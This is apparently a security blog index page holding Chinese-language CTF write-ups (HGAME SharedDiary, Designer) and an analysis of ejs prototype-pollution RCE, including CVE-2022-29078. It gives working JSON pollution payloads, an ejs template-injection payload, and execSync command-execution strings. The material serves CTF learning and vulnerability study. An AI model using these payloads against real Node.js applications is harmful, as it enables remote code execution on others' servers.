req.<span class="property">session</span>.<span class="property">diary</span> = diary</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8888</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>看到12行过滤了<code>__proto__</code> 明显为原型链污染      </p>
<p>64行中存在ejs SSTI  可以通过<code>&lt;% code here %&gt;</code>执行代码  <code>&lt;%= var%&gt;</code> 或 <code>&lt;%- var%&gt;</code> 查看变量</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><h3 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h3><p>过滤了<code>__proto__</code>  仍然可以通过<code>constructor.prototype</code>来构造我们的payload 污染原型链</p>
<p>目的即为<code>role=admin, data.username!=null</code></p>
<p>payload：  注意发包的时候将content-type 改为<code>application/json</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后进入diary界面</p>
<p>payload:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diary=&lt;%- <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;cat /flag&#x27;</span>) %&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h3><p>也可以直接利用ejs.render本身存在的漏洞实现RCE    参考：<a target="_blank" rel="noopener" href="https://antel0p3.github.io/2023/12/25/ejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93RCE/">ejs原型链污染RCE</a></p>
<p>payload:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="attr">&quot;client&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;escapeFunction&quot;</span><span class="punctuation">:</span><span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;);&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>直接在包体中可以获得flag</p>

	
	</div>
  <a type="button" href="/2023/12/28/HGAME2023-SharedDiary-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/12/25/ejs原型链污染RCE/" >ejs原型链污染RCE</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-12-25
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p>需要先理解原型链污染  可以看这篇 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/361333.html">浅析CTF中的Node.js原型链污染</a></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install express</span><br><span class="line">npm install ejs@3.1.9</span><br></pre></td></tr></table></figure>

<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><p>app.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, __dirname);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> malicious_payload = <span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true, &quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(\&#x27;ls\&#x27;)&quot;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_">merge</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(malicious_payload));</span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;./views/diary.ejs&#x27;</span>, &#123;<span class="attr">diary</span>: <span class="string">&quot;diary&quot;</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">4427</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>diary.ejs</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;&lt;%= diary%&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>启动后跟进调试 调用链条：<code>res.render() -&gt; app.render() -&gt; tryRender() -&gt; view.render() -&gt; View.engine() -&gt; tryHandleCache() -&gt; handleCache() -&gt; exports.compile() -&gt; templ.compile()</code></p>
<p>ejs.js   compile中为核心渲染逻辑</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">compile</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@type</span> &#123;<span class="type">string</span>&#125; */</span></span><br><span class="line">    <span class="keyword">var</span> src;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@type</span> &#123;<span class="type">ClientFunction</span>&#125; */</span></span><br><span class="line">    <span class="keyword">var</span> fn;</span><br><span class="line">    <span class="keyword">var</span> opts = <span class="variable language_">this</span>.<span class="property">opts</span>;</span><br><span class="line">    <span class="keyword">var</span> prepended = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> appended = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@type</span> &#123;<span class="type">EscapeCallback</span>&#125; */</span></span><br><span class="line">    <span class="keyword">var</span> escapeFn = opts.<span class="property">escapeFunction</span>;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@type</span> &#123;<span class="type">FunctionConstructor</span>&#125; */</span></span><br><span class="line">    <span class="keyword">var</span> ctor;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@type</span> &#123;<span class="type">string</span>&#125; */</span></span><br><span class="line">    <span class="keyword">var</span> sanitizedFilename = opts.<span class="property">filename</span> ? <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(opts.<span class="property">filename</span>) : <span class="string">&#x27;undefined&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">source</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">generateSource</span>();</span><br><span class="line">        prepended +=</span><br><span class="line">            <span class="string">&#x27;  var __output = &quot;&quot;;\n&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;  function __append(s) &#123; if (s !== undefined &amp;&amp; s !== null) __output += s &#125;\n&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (opts.<span class="property">outputFunctionName</span>) &#123;</span><br><span class="line">            <span class="comment">/***************************************************</span></span><br><span class="line"><span class="comment">            这里对outputFunctionName进行检测</span></span><br><span class="line"><span class="comment">            _JS_IDENTIFIER = /^[a-zA-Z_$][0-9a-zA-Z_$]*$/;</span></span><br><span class="line"><span class="comment">            相当于只能存在字母数字下划线和$  且不以数字开头</span></span><br><span class="line"><span class="comment">            ***************************************************/</span></span><br><span class="line">            <span class="keyword">if</span> (!_JS_IDENTIFIER.<span class="title function_">test</span>(opts.<span class="property">outputFunctionName</span>)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;outputFunctionName is not a valid JS identifier.&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (opts.<span class="property">localsName</span> &amp;&amp; !_JS_IDENTIFIER.<span class="title function_">test</span>(opts.<span class="property">localsName</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;localsName is not a valid JS identifier.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (opts.<span class="property">destructuredLocals</span> &amp;&amp; opts.<span class="property">destructuredLocals</span>.<span class="property">length</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> destructuring = <span class="string">&#x27;  var __locals = (&#x27;</span> + opts.<span class="property">localsName</span> + <span class="string">&#x27; || &#123;&#125;),\n&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; opts.<span class="property">destructuredLocals</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">var</span> name = opts.<span class="property">destructuredLocals</span>[i];</span><br><span class="line">                <span class="keyword">if</span> (!_JS_IDENTIFIER.<span class="title function_">test</span>(name)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;destructuredLocals[&#x27;</span> + i + <span class="string">&#x27;] is not a valid JS identifier.&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    destructuring += <span class="string">&#x27;,\n  &#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                destructuring += name + <span class="string">&#x27; = __locals.&#x27;</span> + name;</span><br><span class="line">            &#125;</span><br><span class="line">            prepended += destructuring + <span class="string">&#x27;;\n&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (opts.<span class="property">_with</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            prepended += <span class="string">&#x27;  with (&#x27;</span> + opts.<span class="property">localsName</span> + <span class="string">&#x27; || &#123;&#125;) &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">            appended += <span class="string">&#x27;  &#125;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        appended += <span class="string">&#x27;  return __output;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">source</span> = prepended + <span class="variable language_">this</span>.<span class="property">source</span> + appended;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (opts.<span class="property">compileDebug</span>) &#123;</span><br><span class="line">        src = <span class="string">&#x27;var __line = 1&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;  , __lines = &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">this</span>.<span class="property">templateText</span>) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;  , __filename = &#x27;</span> + sanitizedFilename + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;try &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">source</span> +</span><br><span class="line">            <span class="string">&#x27;&#125; catch (e) &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;  rethrow(e, __lines, __filename, __line, escapeFn);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&#125;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        src = <span class="variable language_">this</span>.<span class="property">source</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (opts.<span class="property">client</span>) &#123;</span><br><span class="line">        <span class="comment">/***************************************************</span></span><br><span class="line"><span class="comment">        opts.client为true才会进入逻辑  因此原型链污染还要污染client</span></span><br><span class="line"><span class="comment">        这里没有对escapeFn进行检测    且用于构造代码</span></span><br><span class="line"><span class="comment">        第10行有  var escapeFn = opts.escapeFunction;  则也可通过原型链污染控制</span></span><br><span class="line"><span class="comment">        ***************************************************/</span></span><br><span class="line">        src = <span class="string">&#x27;escapeFn = escapeFn || &#x27;</span> + escapeFn.<span class="title function_">toString</span>() + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> + src;</span><br><span class="line">        <span class="keyword">if</span> (opts.<span class="property">compileDebug</span>) &#123;</span><br><span class="line">            src = <span class="string">&#x27;rethrow = rethrow || &#x27;</span> + rethrow.<span class="title function_">toString</span>() + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> + src;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (opts.<span class="property">strict</span>) &#123;</span><br><span class="line">        src = <span class="string">&#x27;&quot;use strict&quot;;\n&#x27;</span> + src;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (opts.<span class="property">debug</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(src);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (opts.<span class="property">compileDebug</span> &amp;&amp; opts.<span class="property">filename</span>) &#123;</span><br><span class="line">        src = src + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;//# sourceURL=&#x27;</span> + sanitizedFilename + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (opts.<span class="property">async</span>) &#123;</span><br><span class="line">            <span class="comment">// Have to use generated function for this, since in envs without support,</span></span><br><span class="line">            <span class="comment">// it breaks in parsing</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ctor = (<span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;return (async function()&#123;&#125;).constructor;&#x27;</span>))();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="title class_">SyntaxError</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;This environment does not support async/await&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> e;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ctor = <span class="title class_">Function</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/***************************************************</span></span><br><span class="line"><span class="comment">        利用src构造函数</span></span><br><span class="line"><span class="comment">        ***************************************************/</span></span><br><span class="line">        fn = <span class="keyword">new</span> <span class="title function_">ctor</span>(opts.<span class="property">localsName</span> + <span class="string">&#x27;, escapeFn, include, rethrow&#x27;</span>, src);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="comment">// istanbul ignore else</span></span><br><span class="line">        <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="title class_">SyntaxError</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (opts.<span class="property">filename</span>) &#123;</span><br><span class="line">                e.<span class="property">message</span> += <span class="string">&#x27; in &#x27;</span> + opts.<span class="property">filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            e.<span class="property">message</span> += <span class="string">&#x27; while compiling ejs\n\n&#x27;</span>;</span><br><span class="line">            e.<span class="property">message</span> += <span class="string">&#x27;If the above error is not helpful, you may want to try EJS-Lint:\n&#x27;</span>;</span><br><span class="line">            e.<span class="property">message</span> += <span class="string">&#x27;https://github.com/RyanZim/EJS-Lint&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (!opts.<span class="property">async</span>) &#123;</span><br><span class="line">                e.<span class="property">message</span> += <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">                e.<span class="property">message</span> += <span class="string">&#x27;Or, if you meant to create an async function, pass `async: true` as an option.&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return a callable function which will execute the function</span></span><br><span class="line">    <span class="comment">// created by the source-code, with the passed data as locals</span></span><br><span class="line">    <span class="comment">// Adds a local `include` function which allows full recursive include</span></span><br><span class="line">    <span class="keyword">var</span> returnedFn = opts.<span class="property">client</span> ? fn : <span class="keyword">function</span> <span class="title function_">anonymous</span>(<span class="params">data</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> include = <span class="keyword">function</span>(<span class="params">path, includeData</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> d = utils.<span class="title function_">shallowCopy</span>(utils.<span class="title function_">createNullProtoObjWherePossible</span>(), data);</span><br><span class="line">            <span class="keyword">if</span> (includeData) &#123;</span><br><span class="line">                d = utils.<span class="title function_">shallowCopy</span>(d, includeData);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">includeFile</span>(path, opts)(d);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> fn.<span class="title function_">apply</span>(opts.<span class="property">context</span>,</span><br><span class="line">            [data || utils.<span class="title function_">createNullProtoObjWherePossible</span>(), escapeFn, include, rethrow]);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (opts.<span class="property">filename</span> &amp;&amp; <span class="keyword">typeof</span> <span class="title class_">Object</span>.<span class="property">defineProperty</span> === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> filename = opts.<span class="property">filename</span>;</span><br><span class="line">        <span class="keyword">var</span> basename = path.<span class="title function_">basename</span>(filename, path.<span class="title function_">extname</span>(filename));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(returnedFn, <span class="string">&#x27;name&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">value</span>: basename,</span><br><span class="line">                <span class="attr">writable</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">enumerable</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">configurable</span>: <span class="literal">true</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="comment">/* ignore */</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> returnedFn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终拼接构造完的函数会返回并被调用  进而实现命令执行</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>也即 CVE-2022-29078<br><code>ejs&lt;=3.1.6</code>中没有对outputFunctionName进行检测  因此可以直接对其注入payload</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(&#x27;ls&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://sk1y233.github.io/2022/11/01/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%85%8D%E5%90%88ejs%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8ERCE%E5%88%86%E6%9E%90/">原型链污染配合ejs模板引擎RCE分析</a></p>
</blockquote>

	
	</div>
  <a type="button" href="/2023/12/25/ejs原型链污染RCE/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/12/20/HGAME2023-Designer-wp/" >HGAME2023-Designer-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-12-20
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3509">题目链接</a>  </p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>register 会用post过去的username，flag和secret生成token  并直接回显</p>
<p>如果发起请求的ip是本地的话  flag为真  否则是假的</p>
